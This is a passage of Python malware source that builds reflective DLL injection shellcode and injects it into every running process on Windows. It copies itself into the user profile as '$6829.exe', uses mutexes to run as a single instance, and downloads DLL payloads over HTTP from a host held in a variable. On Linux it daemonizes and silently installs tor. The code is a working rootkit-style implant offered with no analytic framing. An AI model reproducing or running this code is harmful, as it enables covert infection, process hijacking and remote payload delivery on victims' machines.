        bootstrap += b'\x00\x00\x00'
        bootstrap += b'\x48\x89\xf4'
        bootstrap += b'\x5e'
        bootstrap += b'\xc3'
        if len(bootstrap) != bootstrapSize:
            raise Exception("x64 bootstrap length: {} != bootstrapSize: {}".format(len(bootstrap), bootstrapSize))
        return bootstrap + rdiShellcode + dllBytes + userData
    else:
        rdiShellcode = rdiShellcode32
        bootstrap = b''
        bootstrapSize = 49
        bootstrap += b'\xe8\x00\x00\x00\x00'
        dllOffset = bootstrapSize - len(bootstrap) + len(rdiShellcode)
        bootstrap += b'\x58'
        bootstrap += b'\x55'
        bootstrap += b'\x89\xe5'
        bootstrap += b'\x89\xc2'
        bootstrap += b'\x05'
        bootstrap += struct.pack('I', dllOffset)
        bootstrap += b'\x81\xc2'
        userDataLocation = dllOffset + len(dllBytes)
        bootstrap += struct.pack('I', userDataLocation)
        bootstrap += b'\x68'
        bootstrap += struct.pack('I', asdflags)
        bootstrap += b'\x68'
        bootstrap += struct.pack('I', len(userData))
        bootstrap += b'\x52'
        bootstrap += b'\x68'
        bootstrap += struct.pack('I', functionHash)
        bootstrap += b'\x50'
        bootstrap += b'\xe8'
        bootstrap += struct.pack('b', bootstrapSize - len(bootstrap) - 4) # Skip over the remainder of instructions
        bootstrap += b'\x00\x00\x00'
        bootstrap += b'\x83\xc4\x14'
        bootstrap += b'\xc9'
        bootstrap += b'\xc3'
        if len(bootstrap) != bootstrapSize:
            raise Exception("x86 bootstrap length: {} != bootstrapSize: {}".format(len(bootstrap), bootstrapSize))
        return bootstrap + rdiShellcode + dllBytes + userData
    return False
global injecting
injecting = 0
def injectdll(process_id, shellcode):
    global injecting
    injecting += 1
    process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, process_id)
    if not process_handle:
        injecting -= 1
        return
    memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), 0x00001000, 0x40)
    windll.kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, len(shellcode), 0)
    if not windll.kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0):
        injecting -= 1
        return
    injecting -= 1
def rootkitThread(shellcode):
    while 1:
        for pid in psutil.pids():
            handle = CreateMutex(None, 0, str(pid) + ':$6829')
            if GetLastError() == 183:
                continue
            while injecting >= 4:
                time.sleep(0.1)
            threading.Thread(target=injectdll, args=(pid,shellcode,)).start()
mutex = "udZ=R2y5ShB-^4S6nGgFw"
if os.name == 'nt':
    try:
        sys.argv[1]
    except IndexError:
        subprocess.Popen(GetCommandLine() + " 1", creationflags=8, close_fds=True)
        os.kill(os.getpid(),9)
    mutex = CreateMutex(None, False, mutex)
    if GetLastError() == ERROR_ALREADY_EXISTS:
       os.kill(os.getpid(),9)
    if os.path.abspath(sys.argv[0]).lower().endswith(".exe") and not os.path.abspath(sys.argv[0]).lower().endswith("$6829.exe"):
        try:
            shutil.copyfile(os.path.abspath(sys.argv[0]), os.getenv("USERPROFILE") + "\\$6829.exe")
            os.startfile(os.getenv("USERPROFILE") + "\\$6829.exe")
            os.kill(os.getpid(),9)
        except:
            pass
    else:
        try:
            shutil.copyfile(sys.executable, os.getenv("USERPROFILE") + "\\$6829.exe")
        except:
            pass
    try:
        if platform.architecture()[0].replace("bit","") == "32":
            shellcode=ConvertToShellcode(urllib2.urlopen("http://" + mydomain + "/x86.dll").read())
        else:
            shellcode=ConvertToShellcode(urllib2.urlopen("http://" + mydomain + "/x64.dll").read())
        threading.Thread(target=rootkitThread, args=(shellcode,)).start()
    except:
        pass
else:
    daemonize()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind('\0' + mutex) 
    except socket.error as e:
        os.kill(os.getpid(),9)
    os.popen("apt install tor -y > /dev/null 2>&1 &")
    os.popen("yum install tor -y > /dev/null 2>&1 &")
    os.popen("dnf install tor -y > /dev/null 2>&1 &")
threading.Thread(target=mainprocess, args=()).start()
